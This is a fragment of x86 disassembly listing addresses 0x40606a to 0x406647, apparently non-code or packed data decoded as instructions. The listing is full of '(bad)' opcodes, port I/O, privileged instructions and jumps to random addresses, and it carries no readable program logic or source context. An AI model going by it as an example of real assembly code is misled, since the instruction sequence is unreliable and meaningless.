  40606a:	6b 99 bc fd d0 2b 85 	imul   $0xffffff85,0x2bd0fdbc(%ecx),%ebx
  406071:	1d c0 d8 28 a8       	sbb    $0xa828d8c0,%eax
  406076:	4a                   	dec    %edx
  406077:	2d aa 7e 49 22       	sub    $0x22497eaa,%eax
  40607c:	92                   	xchg   %eax,%edx
  40607d:	16                   	push   %ss
  40607e:	ec                   	in     (%dx),%al
  40607f:	26 ec                	es in  (%dx),%al
  406081:	f7 34 cf             	divl   (%edi,%ecx,8)
  406084:	75 ce                	jne    0x406054
  406086:	78 6e                	js     0x4060f6
  406088:	4e                   	dec    %esi
  406089:	e8 a0 3c a1 69       	call   0x69e19d2e
  40608e:	9a 93 c8 98 7c 12 24 	lcall  $0x2412,$0x7c98c893
  406095:	42                   	inc    %edx
  406096:	73 6e                	jae    0x406106
  406098:	d7                   	xlat   %ds:(%ebx)
  406099:	0c 70                	or     $0x70,%al
  40609b:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40609c:	0a 3b                	or     (%ebx),%bh
  40609e:	11 45 36             	adc    %eax,0x36(%ebp)
  4060a1:	a9 2a 6d db 8c       	test   $0x8cdb6d2a,%eax
  4060a6:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4060a7:	c7                   	(bad)
  4060a8:	cf                   	iret
  4060a9:	0e                   	push   %cs
  4060aa:	a9 d1 b4 30 b5       	test   $0xb530b4d1,%eax
  4060af:	05 d4 63 1d 8c       	add    $0x8c1d63d4,%eax
  4060b4:	99                   	cltd
  4060b5:	36 a3 bd c7 1d 6f    	mov    %eax,%ss:0x6f1dc7bd
  4060bb:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4060bc:	a2 82 e3 42 8a       	mov    %al,0x8a42e382
  4060c1:	44                   	inc    %esp
  4060c2:	59                   	pop    %ecx
  4060c3:	22 de                	and    %dh,%bl
  4060c5:	22 9f 4e ff 00 df    	and    -0x20ff00b2(%edi),%bl
  4060cb:	e1 38                	loope  0x406105
  4060cd:	b2 b1                	mov    $0xb1,%dl
  4060cf:	1a 9b a2 48 19 d0    	sbb    -0x2fe6b75e(%ebx),%bl
  4060d5:	0a fa                	or     %dl,%bh
  4060d7:	e3 73                	jecxz  0x40614c
  4060d9:	79 45                	jns    0x406120
  4060db:	a3 bf a6 9c b7       	mov    %eax,0xb79ca6bf
  4060e0:	d0 a7 be 0e d3 66    	shlb   $1,0x66d30ebe(%edi)
  4060e6:	5f                   	pop    %edi
  4060e7:	33 6a 9a             	xor    -0x66(%edx),%ebp
  4060ea:	85 53 5d             	test   %edx,0x5d(%ebx)
  4060ed:	fb                   	sti
  4060ee:	5f                   	pop    %edi
  4060ef:	1a 63 df             	sbb    -0x21(%ebx),%ah
  4060f2:	f7 1d b5 d6 e9 10    	negl   0x10e9d6b5
  4060f8:	91                   	xchg   %eax,%ecx
  4060f9:	c4                   	(bad)
  4060fa:	fc                   	cld
  4060fb:	22 98 53 23 26 72    	and    0x72262353(%eax),%bl
  406101:	81 70 99 a7 f3 3b 66 	xorl   $0x663bf3a7,-0x67(%eax)
  406108:	e2 a6                	loop   0x4060b0
  40610a:	5d                   	pop    %ebp
  40610b:	36 87 85 45 2d f1 e2 	xchg   %eax,%ss:-0x1d0ed2bb(%ebp)
  406112:	6f                   	outsl  %ds:(%esi),(%dx)
  406113:	d3 f0                	shl    %cl,%eax
  406115:	8e d7                	mov    %edi,%ss
  406117:	61                   	popa
  406118:	c8 e8 b6 78          	enter  $0xb6e8,$0x78
  40611c:	67 1b d8             	addr16 sbb %eax,%ebx
  40611f:	86 67 f9             	xchg   %ah,-0x7(%edi)
  406122:	ba 0f b8 9f 9d       	mov    $0x9d9fb80f,%edx
  406127:	15 23 5b ef 08       	adc    $0x8ef5b23,%eax
  40612c:	95                   	xchg   %eax,%ebp
  40612d:	fa                   	cli
  40612e:	dd 52 79             	fstl   0x79(%edx)
  406131:	3a 4f be             	cmp    -0x42(%edi),%cl
  406134:	ae                   	scas   %es:(%edi),%al
  406135:	be a3 3b 0a 01       	mov    $0x10a3ba3,%esi
  40613a:	d3 74 91 15          	shll   %cl,0x15(%ecx,%edx,4)
  40613e:	44                   	inc    %esp
  40613f:	71 91                	jno    0x4060d2
  406141:	04 04                	add    $0x4,%al
  406143:	5c                   	pop    %esp
  406144:	8a fd                	mov    %ch,%bh
  406146:	3b b6 f1 8b 8b 7b    	cmp    0x7b8b8bf1(%esi),%esi
  40614c:	98                   	cwtl
  40614d:	d7                   	xlat   %ds:(%ebx)
  40614e:	58                   	pop    %eax
  40614f:	d7                   	xlat   %ds:(%ebx)
  406150:	34 b4                	xor    $0xb4,%al
  406152:	0e                   	push   %cs
  406153:	1a 08                	sbb    (%eax),%cl
  406155:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406156:	f7 1d 33 dc a4 a7    	negl   0xa7a4dc33
  40615c:	9b                   	fwait
  40615d:	78 64                	js     0x4061c3
  40615f:	74 a4                	je     0x406105
  406161:	0a 13                	or     (%ebx),%dl
  406163:	82 e2 2f             	and    $0x2f,%dl
  406166:	4c                   	dec    %esp
  406167:	d0 48 9b             	rorb   $1,-0x65(%eax)
  40616a:	6c                   	insb   (%dx),%es:(%edi)
  40616b:	07                   	pop    %es
  40616c:	77 90                	ja     0x4060fe
  40616e:	63 e1                	arpl   %esp,%ecx
  406170:	71 f1                	jno    0x406163
  406172:	f5                   	cmc
  406173:	70 83                	jo     0x4060f8
  406175:	8a 83 da b0 26 02    	mov    0x226b0da(%ebx),%al
  40617b:	ec                   	in     (%dx),%al
  40617c:	8e 54 86 5a          	mov    0x5a(%esi,%eax,4),%ss
  406180:	05 be b3 77 11       	add    $0x1177b3be,%eax
  406185:	30 92 27 ca 75 b4    	xor    %dl,-0x4b8a35d9(%edx)
  40618b:	68 14 4c d0 95       	push   $0x95d04c14
  406190:	d2 c2                	rol    %cl,%dl
  406192:	c7                   	(bad)
  406193:	14 51                	adc    $0x51,%al
  406195:	40                   	inc    %eax
  406196:	68 d5 3e 73 84       	push   $0x84733ed5
  40619b:	44                   	inc    %esp
  40619c:	51                   	push   %ecx
  40619d:	f8                   	clc
  40619e:	1e                   	push   %ds
  40619f:	dc 26                	fsubl  (%esi)
  4061a1:	40                   	inc    %eax
  4061a2:	cf                   	iret
  4061a3:	2c de                	sub    $0xde,%al
  4061a5:	0a 88 69 4d 63 53    	or     0x53634d69(%eax),%cl
  4061ab:	f9                   	stc
  4061ac:	30 a6 52 29 5a 87    	xor    %ah,-0x78a5d6ae(%esi)
  4061b2:	6d                   	insl   (%dx),%es:(%edi)
  4061b3:	32 71 61             	xor    0x61(%ecx),%dh
  4061b6:	54                   	push   %esp
  4061b7:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4061b8:	b7 52                	mov    $0x52,%bh
  4061ba:	a2 30 fc 38 c0       	mov    %al,0xc038fc30
  4061bf:	86 0c 46             	xchg   %cl,(%esi,%eax,2)
  4061c2:	de ae 23 6f fb cd    	fisubrs -0x320490dd(%esi)
  4061c8:	ad                   	lods   %ds:(%esi),%eax
  4061c9:	ab                   	stos   %eax,%es:(%edi)
  4061ca:	2c 8b                	sub    $0x8b,%al
  4061cc:	19 71 55             	sbb    %esi,0x55(%ecx)
  4061cf:	37                   	aaa
  4061d0:	a3 8d 88 20 ae       	mov    %eax,0xae20888d
  4061d5:	44                   	inc    %esp
  4061d6:	f8                   	clc
  4061d7:	77 07                	ja     0x4061e0
  4061d9:	6a cc                	push   $0xffffffcc
  4061db:	4a                   	dec    %edx
  4061dc:	8b ae 3f 08 6d 41    	mov    0x416d083f(%esi),%ebp
  4061e2:	79 6d                	jns    0x406251
  4061e4:	53                   	push   %ebx
  4061e5:	a0 82 bf af 9b       	mov    0x9bafbf82,%al
  4061ea:	f1                   	int1
  4061eb:	c3                   	ret
  4061ec:	50                   	push   %eax
  4061ed:	b9 69 18 0e 93       	mov    $0x930e1869,%ecx
  4061f2:	cc                   	int3
  4061f3:	1e                   	push   %ds
  4061f4:	9c                   	pushf
  4061f5:	5e                   	pop    %esi
  4061f6:	72 d5                	jb     0x4061cd
  4061f8:	d7                   	xlat   %ds:(%ebx)
  4061f9:	d5 49                	aad    $0x49
  4061fb:	f9                   	stc
  4061fc:	3d 5b bd b6 06       	cmp    $0x6b6bd5b,%eax
  406201:	4b                   	dec    %ebx
  406202:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  406203:	a2 84 aa be d7       	mov    %al,0xd7beaa84
  406208:	6a 2f                	push   $0x2f
  40620a:	6c                   	insb   (%dx),%es:(%edi)
  40620b:	0b 63 df             	or     -0x21(%ebx),%esp
  40620e:	6f                   	outsl  %ds:(%esi),(%dx)
  40620f:	1b 48 d4             	sbb    -0x2c(%eax),%ecx
  406212:	42                   	inc    %edx
  406213:	01 e7                	add    %esp,%edi
  406215:	1c 96                	sbb    $0x96,%al
  406217:	d9 5b a7             	fstps  -0x59(%ebx)
  40621a:	48                   	dec    %eax
  40621b:	24 5b                	and    $0x5b,%al
  40621d:	ba df 8a 3c fc       	mov    $0xfc3c8adf,%edx
  406222:	13 af 26 48 88 53    	adc    0x53884826(%edi),%ebp
  406228:	6a ee                	push   $0xffffffee
  40622a:	2c 6d                	sub    $0x6d,%al
  40622c:	da 99 ee 2a a3 85    	ficompl -0x7a5cd512(%ecx)
  406232:	c1 2a a7             	shrl   $0xa7,(%edx)
  406235:	df ba f0 06 35 35    	fistpll 0x353506f0(%edx)
  40623b:	8c aa 01 a0 a4 75    	mov    %gs,0x75a4a001(%edx)
  406241:	22 c8                	and    %al,%cl
  406243:	75 36                	jne    0x40627b
  406245:	12 20                	adc    (%eax),%ah
  406247:	0e                   	push   %cs
  406248:	e4 2f                	in     $0x2f,%al
  40624a:	20 4c aa 2a          	and    %cl,0x2a(%edx,%ebp,4)
  40624e:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40624f:	48                   	dec    %eax
  406250:	70 a9                	jo     0x4061fb
  406252:	b9 53 e7 ba a6       	mov    $0xa6bae753,%ecx
  406257:	38 03                	cmp    %al,(%ebx)
  406259:	16                   	push   %ss
  40625a:	cf                   	iret
  40625b:	aa                   	stos   %al,%es:(%edi)
  40625c:	20 ea                	and    %ch,%dl
  40625e:	02 e9                	add    %cl,%ch
  406260:	12 58 4d             	adc    0x4d(%eax),%bl
  406263:	be 80 82 4e 36       	mov    $0x364e8280,%esi
  406268:	a2 85 bb ba 08       	mov    %al,0x8babb85
  40626d:	91                   	xchg   %eax,%ecx
  40626e:	12 26                	adc    (%esi),%ah
  406270:	32 84 3f a9 3e 7b af 	xor    -0x5084c157(%edi,%edi,1),%al
  406277:	7d dc                	jge    0x406255
  406279:	48                   	dec    %eax
  40627a:	25 81 1f 5c 51       	and    $0x515c1f81,%eax
  40627f:	e9 cc e7 13 48       	jmp    0x48544a50
  406284:	04 82                	add    $0x82,%al
  406286:	a0 06 a8 46 19       	mov    0x1946a806,%al
  40628b:	25 35 44 42 54       	and    $0x54424435,%eax
  406290:	24 4d                	and    $0x4d,%al
  406292:	a2 42 38 de 9f       	mov    %al,0x9fde3842
  406297:	fb                   	sti
  406298:	8f                   	(bad)
  406299:	d5 c1                	aad    $0xc1
  40629b:	96                   	xchg   %eax,%esi
  40629c:	a0 e5 ac 0e 27       	mov    0x270eace5,%al
  4062a1:	14 95                	adc    $0x95,%al
  4062a3:	6c                   	insb   (%dx),%es:(%edi)
  4062a4:	88 9b 35 43 5c 0a    	mov    %bl,0xa5c4335(%ebx)
  4062aa:	8a e5                	mov    %ch,%ah
  4062ac:	10 00                	adc    %al,(%eax)
  4062ae:	17                   	pop    %ss
  4062af:	e9 41 3f 95 dc       	jmp    0xdcd5a1f5
  4062b4:	5b                   	pop    %ebx
  4062b5:	95                   	xchg   %eax,%ebp
  4062b6:	53                   	push   %ebx
  4062b7:	b6 d4                	mov    $0xd4,%dh
  4062b9:	1e                   	push   %ds
  4062ba:	fd                   	std
  4062bb:	b8 6a 58 c8 e7       	mov    $0xe7c8586a,%eax
  4062c0:	58                   	pop    %eax
  4062c1:	1b ae ad 05 0a 33    	sbb    0x330a05ad(%esi),%ebp
  4062c7:	0e                   	push   %cs
  4062c8:	1c 81                	sbb    $0x81,%al
  4062ca:	22 dc                	and    %ah,%bl
  4062cc:	a0 88 82 88 00       	mov    0x888288,%al
  4062d1:	28 83 d3 1e c4 20    	sub    %al,0x20c41ed3(%ebx)
  4062d7:	e2 ae                	loop   0x406287
  4062d9:	c5 c7 d3             	(bad)
  4062dc:	bb 2a 5f 57 df       	mov    $0xdf575f2a,%ebx
  4062e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4062e2:	0d 4b 5a 9d 72       	or     $0x729d5a4b,%eax
  4062e7:	30 02                	xor    %al,(%edx)
  4062e9:	6a 69                	push   $0x69
  4062eb:	6d                   	insl   (%dx),%es:(%edi)
  4062ec:	69 05 1a 49 3e 80 ad 	imul   $0x3a222aad,0x803e491a,%eax
  4062f3:	2a 22 3a 
  4062f6:	8a 88 2a 22 9b 8d    	mov    -0x7264ddd6(%eax),%cl
  4062fc:	32 aa 48 a8 79 12    	xor    0x1279a848(%edx),%ch
  406302:	f0 da aa 89 dd 38 6a 	lock fisubrl 0x6a38dd89(%edx)
  406309:	5d                   	pop    %ebp
  40630a:	74 ef                	je     0x4062fb
  40630c:	45                   	inc    %ebp
  40630d:	26 9a 00 62 60 c3 66 	es lcall $0xf266,$0xc3606200
  406314:	f2 
  406315:	20 29                	and    %ch,(%ecx)
  406317:	88 83 85 bc 08 04    	mov    %al,0x408bc85(%ebx)
  40631d:	d5 0c                	aad    $0xc
  40631f:	87 b1 83 0c 97 64    	xchg   %esi,0x64970c83(%ecx)
  406325:	44                   	inc    %esp
  406326:	54                   	push   %esp
  406327:	ec                   	in     (%dx),%al
  406328:	b8 f2 fb 7f 57       	mov    $0x577ffbf2,%eax
  40632d:	0c 42                	or     $0x42,%al
  40632f:	b1 32                	mov    $0x32,%cl
  406331:	a3 ce 46 9d 18       	mov    %eax,0x189d46ce
  406336:	92                   	xchg   %eax,%edx
  406337:	09 e7                	or     %esp,%edi
  406339:	91                   	xchg   %eax,%ecx
  40633a:	51                   	push   %ecx
  40633b:	0f a9                	pop    %gs
  40633d:	e0 0a                	loopne 0x406349
  40633f:	bb 97 60 b0 df       	mov    $0xdfb06097,%ebx
  406344:	c9                   	leave
  406345:	12 e3                	adc    %bl,%ah
  406347:	ea 43 c2 ff 00 4f 7e 	ljmp   $0x7e4f,$0xffc243
  40634e:	fc                   	cld
  40634f:	48                   	dec    %eax
  406350:	27                   	daa
  406351:	41                   	inc    %ecx
  406352:	ce                   	into
  406353:	2a c3                	sub    %bl,%al
  406355:	20 47 56             	and    %al,0x56(%edi)
  406358:	13 57 92             	adc    -0x6e(%edi),%edx
  40635b:	43                   	inc    %ebx
  40635c:	2e c9                	cs leave
  40635e:	31 16                	xor    %edx,(%esi)
  406360:	da 5f cb             	ficompl -0x35(%edi)
  406363:	36 54                	ss push %esp
  406365:	15 30 d3 0b dd       	adc    $0xdd0bd330,%eax
  40636a:	55                   	push   %ebp
  40636b:	c2 61 10             	ret    $0x1061
  40636e:	b2 88                	mov    $0x88,%dl
  406370:	bf d8 91 7e 78       	mov    $0x787e91d8,%edi
  406375:	f5                   	cmc
  406376:	49                   	dec    %ecx
  406377:	00 72 11             	add    %dh,0x11(%edx)
  40637a:	71 e1                	jno    0x40635d
  40637c:	ac                   	lods   %ds:(%esi),%al
  40637d:	0a 2a                	or     (%edx),%ch
  40637f:	f3 5d                	repz pop %ebp
  406381:	0e                   	push   %cs
  406382:	ab                   	stos   %eax,%es:(%edi)
  406383:	8c 93 64 e8 21 18    	mov    %ss,0x1821e864(%ebx)
  406389:	ba 8d a1 8f 87       	mov    $0x878fa18d,%edx
  40638e:	75 36                	jne    0x4063c6
  406390:	80 45 7f 37          	addb   $0x37,0x7f(%ebp)
  406394:	02 4a 84             	add    -0x7c(%edx),%cl
  406397:	a8 a8                	test   $0xa8,%al
  406399:	bf ab 81 34 ca       	mov    $0xca3481ab,%edi
  40639e:	0e                   	push   %cs
  40639f:	55                   	push   %ebp
  4063a0:	f4                   	hlt
  4063a1:	a0 80 00 1b 5a       	mov    0x5a1b0080,%al
  4063a6:	40                   	inc    %eax
  4063a7:	7e b5                	jle    0x40635e
  4063a9:	52                   	push   %edx
  4063aa:	a9 48 8c f4 9f       	test   $0x9ff48c48,%eax
  4063af:	6a 0d                	push   $0xd
  4063b1:	b8 d9 18 92 ba       	mov    $0xba9218d9,%eax
  4063b6:	d9 27                	fldenv (%edi)
  4063b8:	ba 68 70 bd 7d       	mov    $0x7dbd7068,%edx
  4063bd:	c0 6b b1 d4          	shrb   $0xd4,-0x4f(%ebx)
  4063c1:	13 ce                	adc    %esi,%ecx
  4063c3:	cc                   	int3
  4063c4:	61                   	popa
  4063c5:	38 03                	cmp    %al,(%ebx)
  4063c7:	4c                   	dec    %esp
  4063c8:	bb 32 b1 1d db       	mov    $0xdb1db132,%ebx
  4063cd:	9a 23 e3 55 19 09 87 	lcall  $0x8709,$0x1955e323
  4063d4:	91                   	xchg   %eax,%ecx
  4063d5:	5a                   	pop    %edx
  4063d6:	71 a4                	jno    0x40637c
  4063d8:	11 44 de da          	adc    %eax,-0x26(%esi,%ebx,8)
  4063dc:	13 ed                	adc    %ebp,%ebp
  4063de:	e1 05                	loope  0x4063e5
  4063e0:	43                   	inc    %ebx
  4063e1:	72 22                	jb     0x406405
  4063e3:	12 17                	adc    (%edi),%dl
  4063e5:	6e                   	outsb  %ds:(%esi),(%dx)
  4063e6:	e3 84                	jecxz  0x40636c
  4063e8:	2f                   	das
  4063e9:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4063ea:	fd                   	std
  4063eb:	78 80                	js     0x40636d
  4063ed:	fd                   	std
  4063ee:	a2 3c 47 3e 38       	mov    %al,0x383e473c
  4063f3:	40                   	inc    %eax
  4063f4:	46                   	inc    %esi
  4063f5:	d6                   	salc
  4063f6:	f1                   	int1
  4063f7:	f7 09 d5 6b b9 bc    	testl  $0xbcb96bd5,(%ecx)
  4063fd:	22 a3 bc 09 37 08    	and    0x83709bc(%ebx),%ah
  406403:	99                   	cltd
  406404:	8a 61 54             	mov    0x54(%ecx),%ah
  406407:	71 b5                	jno    0x4063be
  406409:	15 32 aa 3f 62       	adc    $0x623faa32,%eax
  40640e:	dd c0                	ffree  %st(0)
  406410:	e2 bc                	loop   0x4063ce
  406412:	f7 6b 09             	imull  0x9(%ebx)
  406415:	db a8 3b 10 9d 64    	fldt   0x649d103b(%eax)
  40641b:	49                   	dec    %ecx
  40641c:	91                   	xchg   %eax,%ecx
  40641d:	17                   	pop    %ss
  40641e:	c8 3a 48 28          	enter  $0x483a,$0x28
  406422:	ad                   	lods   %ds:(%esi),%eax
  406423:	a1 81 22 a2 b8       	mov    0xb8a22281,%eax
  406428:	6f                   	outsl  %ds:(%esi),(%dx)
  406429:	0e                   	push   %cs
  40642a:	3a 49 85             	cmp    -0x7b(%ecx),%cl
  40642d:	1c f7                	sbb    $0xf7,%al
  40642f:	c2 fd f7             	ret    $0xf7fd
  406432:	70 60                	jo     0x406494
  406434:	5a                   	pop    %edx
  406435:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406436:	13 94 13 a3 53 9d 34 	adc    0x349d53a3(%ebx,%edx,1),%edx
  40643d:	88 cd                	mov    %cl,%ch
  40643f:	41                   	inc    %ecx
  406440:	d2 17                	rclb   %cl,(%edi)
  406442:	64 3b bf ae c1 38 ac 	cmp    %fs:-0x53c73e52(%edi),%edi
  406449:	0b 82 82 a9 bd 7b    	or     0x7bbda982(%edx),%eax
  40644f:	64 d1 53 b2          	rcll   $1,%fs:-0x4e(%ebx)
  406453:	6e                   	outsb  %ds:(%esi),(%dx)
  406454:	c2 8e 7b             	ret    $0x7b8e
  406457:	17                   	pop    %ss
  406458:	ef                   	out    %eax,(%dx)
  406459:	c4 69 52             	les    0x52(%ecx),%ebp
  40645c:	05 c1 a2 e2 80       	add    $0x80e2a2c1,%eax
  406461:	0a 6a 20             	or     0x20(%edx),%ch
  406464:	67 56                	addr16 push %esi
  406466:	9a 68 e3 a1 b1 b4 d8 	lcall  $0xd8b4,$0xb1a1e368
  40646d:	e2 a1                	loop   0x406410
  40646f:	ae                   	scas   %es:(%edi),%al
  406470:	10 fa                	adc    %bh,%dl
  406472:	98                   	cwtl
  406473:	ef                   	out    %eax,(%dx)
  406474:	84 ed                	test   %ch,%ch
  406476:	8e c8                	mov    %eax,%cs
  406478:	b9 ed f1 f4 f0       	mov    $0xf0f4f1ed,%ecx
  40647d:	8c f9                	mov    %?,%ecx
  40647f:	85 4d 05             	test   %ecx,0x5(%ebp)
  406482:	0d b0 69 69 cb       	or     $0xcb6969b0,%eax
  406487:	bd fc a2 27 28       	mov    $0x2827a2fc,%ebp
  40648c:	c0 cd d4             	ror    $0xd4,%ch
  40648f:	02 6b 0a             	add    0xa(%ebx),%ch
  406492:	a8 a8                	test   $0xa8,%al
  406494:	4a                   	dec    %edx
  406495:	bb 70 2a a8 ab       	mov    $0xaba82a70,%ebx
  40649a:	b5 13                	mov    $0x13,%ch
  40649c:	b2 f9                	mov    $0xf9,%dl
  40649e:	27                   	daa
  40649f:	6f                   	outsl  %ds:(%esi),(%dx)
  4064a0:	f4                   	hlt
  4064a1:	e3 3a                	jecxz  0x4064dd
  4064a3:	63 d4                	arpl   %edx,%esp
  4064a5:	90                   	nop
  4064a6:	34 86                	xor    $0x86,%al
  4064a8:	d0 12                	rclb   $1,(%edx)
  4064aa:	45                   	inc    %ebp
  4064ab:	63 b6 3c a5 57 99    	arpl   %esi,-0x66a85ac4(%esi)
  4064b1:	15 15 5c b8 2a       	adc    $0x2ab85c15,%eax
  4064b6:	e0 90                	loopne 0x406448
  4064b8:	22 ab 89 b7 03 85    	and    -0x7afc4877(%ebx),%ch
  4064be:	44                   	inc    %esp
  4064bf:	ca 17 6f             	lret   $0x6f17
  4064c2:	f6 e1                	mul    %cl
  4064c4:	6b ea e0             	imul   $0xffffffe0,%edx,%ebp
  4064c7:	c1 a2 6d 4f 61 0d 19 	shll   $0x19,0xd614f6d(%edx)
  4064ce:	7c cf                	jl     0x40649f
  4064d0:	b8 bd dd 11 95       	mov    $0x9511ddbd,%eax
  4064d5:	51                   	push   %ecx
  4064d6:	16                   	push   %ss
  4064d7:	8c b3 b4 5c 4e eb    	mov    %?,-0x14b1a34c(%ebx)
  4064dd:	b8 b0 8b db 3e       	mov    $0x3edb8bb0,%eax
  4064e2:	3f                   	aas
  4064e3:	2b c5                	sub    %ebp,%eax
  4064e5:	97                   	xchg   %eax,%edi
  4064e6:	30 3b                	xor    %bh,(%ebx)
  4064e8:	4c                   	dec    %esp
  4064e9:	56                   	push   %esi
  4064ea:	a1 48 a8 c8 c1       	mov    0xc1c8a848,%eax
  4064ef:	8e 8c db cd 74 d4 49 	mov    0x49d474cd(%ebx,%ebx,8),%cs
  4064f6:	5c                   	pop    %esp
  4064f7:	df b1 15 11 14 49    	fbstp  0x49141115(%ecx)
  4064fd:	03 e5                	add    %ebp,%esp
  4064ff:	10 c0                	adc    %al,%al
  406501:	93                   	xchg   %eax,%ebx
  406502:	0a 7b 93             	or     -0x6d(%ebx),%bh
  406505:	b2 a9                	mov    $0xa9,%dl
  406507:	2f                   	das
  406508:	fb                   	sti
  406509:	70 d0                	jo     0x4064db
  40650b:	1a 12                	sbb    (%edx),%dl
  40650d:	32 85 a6 b0 2d 94    	xor    -0x6bd24f5a(%ebp),%al
  406513:	10 59 9a             	adc    %bl,-0x66(%ecx)
  406516:	cb                   	lret
  406517:	71 9b                	jno    0x4064b4
  406519:	17                   	pop    %ss
  40651a:	cb                   	lret
  40651b:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40651c:	60                   	pusha
  40651d:	7d 32                	jge    0x406551
  40651f:	15 6b eb dc a4       	adc    $0xa4dceb6b,%eax
  406524:	82 4a 62 ab          	orb    $0xab,0x62(%edx)
  406528:	db 6a f6             	fldt   -0xa(%edx)
  40652b:	2c f7                	sub    $0xf7,%al
  40652d:	db e4                	fnsetpm(287 only)
  40652f:	bb 78 76 44 c5       	mov    $0xc5447678,%ebx
  406534:	5c                   	pop    %esp
  406535:	8f                   	(bad)
  406536:	d9 80 3a 92 08 07    	flds   0x708923a(%eax)
  40653c:	38 8e d5 2a d2 a5    	cmp    %cl,-0x5a2dd52b(%esi)
  406542:	36 41                	ss inc %ecx
  406544:	b9 5b 20 47 05       	mov    $0x547205b,%ecx
  406549:	b4 25                	mov    $0x25,%ah
  40654b:	14 33                	adc    $0x33,%al
  40654d:	52                   	push   %edx
  40654e:	45                   	inc    %ebp
  40654f:	10 4e a2             	adc    %cl,-0x5e(%esi)
  406552:	17                   	pop    %ss
  406553:	c6 c4 fd             	mov    $0xfd,%ah
  406556:	d0 53 1f             	rclb   $1,0x1f(%ebx)
  406559:	4e                   	dec    %esi
  40655a:	ee                   	out    %al,(%dx)
  40655b:	fc                   	cld
  40655c:	69 24 d6 d0 1b 61 16 	imul   $0x16611bd0,(%esi,%edx,8),%esp
  406563:	5a                   	pop    %edx
  406564:	9c                   	pushf
  406565:	c6                   	(bad)
  406566:	71 15                	jno    0x40657d
  406568:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  406569:	1b 91 9c 91 f9 c4    	sbb    -0x3b066e64(%ecx),%edx
  40656f:	da 3a                	fidivrl (%edx)
  406571:	e2 3a                	loop   0x4065ad
  406573:	40                   	inc    %eax
  406574:	d9 36                	fnstenv (%esi)
  406576:	fa                   	cli
  406577:	3a a8 bd 35 54 02    	cmp    0x25435bd(%eax),%ch
  40657d:	c6                   	(bad)
  40657e:	d0 d8                	rcr    $1,%al
  406580:	7d d0                	jge    0x406552
  406582:	55                   	push   %ebp
  406583:	14 54                	adc    $0x54,%al
  406585:	7b f7                	jnp    0x40657e
  406587:	e1 a4                	loope  0x40652d
  406589:	7c aa                	jl     0x406535
  40658b:	6a d7                	push   $0xffffffd7
  40658d:	7c 60                	jl     0x4065ef
  40658f:	73 40                	jae    0x4065d1
  406591:	00 76 af             	add    %dh,-0x51(%esi)
  406594:	ba 1e 24 99 4b       	mov    $0x4b99241e,%edx
  406599:	46                   	inc    %esi
  40659a:	9b                   	fwait
  40659b:	22 4d 9e             	and    -0x62(%ebp),%cl
  40659e:	4a                   	dec    %edx
  40659f:	02 0c fd 04 08 a8 0f 	add    0xfa80804(,%edi,8),%cl
  4065a6:	83 84 3f 5a 96 e4 52 	addl   $0xfffffff8,0x52e4965a(%edi,%edi,1)
  4065ad:	f8 
  4065ae:	54                   	push   %esp
  4065af:	ed                   	in     (%dx),%eax
  4065b0:	dc b8 ac d7 ad 43    	fdivrl 0x43add7ac(%eax)
  4065b6:	52                   	push   %edx
  4065b7:	b1 e9                	mov    $0xe9,%cl
  4065b9:	75 1a                	jne    0x4065d5
  4065bb:	1c fa                	sbb    $0xfa,%al
  4065bd:	d1 0a                	rorl   $1,(%edx)
  4065bf:	7e 33                	jle    0x4065f4
  4065c1:	bd 40 26 de 71       	mov    $0x71de2640,%ebp
  4065c6:	57                   	push   %edi
  4065c7:	62 a2 b4 04 80 a8    	bound  %esp,-0x577ffb4c(%edx)
  4065cd:	aa                   	stos   %al,%es:(%edi)
  4065ce:	4b                   	dec    %ebx
  4065cf:	bf 3f 75 0c a2       	mov    $0xa20c753f,%edi
  4065d4:	f8                   	clc
  4065d5:	f6 4e 33 da          	testb  $0xda,0x33(%esi)
  4065d9:	87 53 c5             	xchg   %edx,-0x3b(%ebx)
  4065dc:	0f 29 00             	movaps %xmm0,(%eax)
  4065df:	12 1a                	adc    (%edx),%bl
  4065e1:	90                   	nop
  4065e2:	dd 31                	fnsave (%ecx)
  4065e4:	9d                   	popf
  4065e5:	8a a7 bd 08 11 bd    	mov    -0x42eef743(%edi),%ah
  4065eb:	8a 88 81 b9 32 bf    	mov    -0x40cd467f(%eax),%cl
  4065f1:	0a 43 f0             	or     -0x10(%ebx),%al
  4065f4:	b9 5c e7 81 94       	mov    $0x9481e75c,%ecx
  4065f9:	14 24                	adc    $0x24,%al
  4065fb:	44                   	inc    %esp
  4065fc:	b8 ce bc 8c 44       	mov    $0x448cbcce,%eax
  406601:	5d                   	pop    %ebp
  406602:	30 6c 88 91          	xor    %ch,-0x6f(%eax,%ecx,4)
  406606:	ef                   	out    %eax,(%dx)
  406607:	cd 05                	int    $0x5
  406609:	51                   	push   %ecx
  40660a:	70 54                	jo     0x406660
  40660c:	11 5a 54             	adc    %ebx,0x54(%edx)
  40660f:	54                   	push   %esp
  406610:	c3                   	ret
  406611:	62 45 f0             	bound  %eax,-0x10(%ebp)
  406614:	78 45                	js     0x40665b
  406616:	ce                   	into
  406617:	7f 57                	jg     0x406670
  406619:	03 36                	add    (%esi),%esi
  40661b:	a9 c9 b3 8b 0b       	test   $0xb8bb3c9,%eax
  406620:	88 1b                	mov    %bl,(%ebx)
  406622:	bb b1 1d a9 49       	mov    $0x49a91db1,%ebx
  406627:	1d 8d b9 95 73       	sbb    $0x7395b98d,%eax
  40662c:	c9                   	leave
  40662d:	41                   	inc    %ecx
  40662e:	50                   	push   %eax
  40662f:	54                   	push   %esp
  406630:	36 12 96 51 13 b7 f2 	adc    %ss:-0xd48ecaf(%esi),%dl
  406637:	f0 bb 72 89 8c 7e    	lock mov $0x7e8c8972,%ebx
  40663d:	9e                   	sahf
  40663e:	15 9c c0 90 dc       	adc    $0xdc90c09c,%eax
  406643:	42                   	inc    %edx
  406644:	0e                   	push   %cs
  406645:	99                   	cltd
  406646:	5c                   	pop    %esp
  406647:	21 13                	and    %edx,(%ebx)
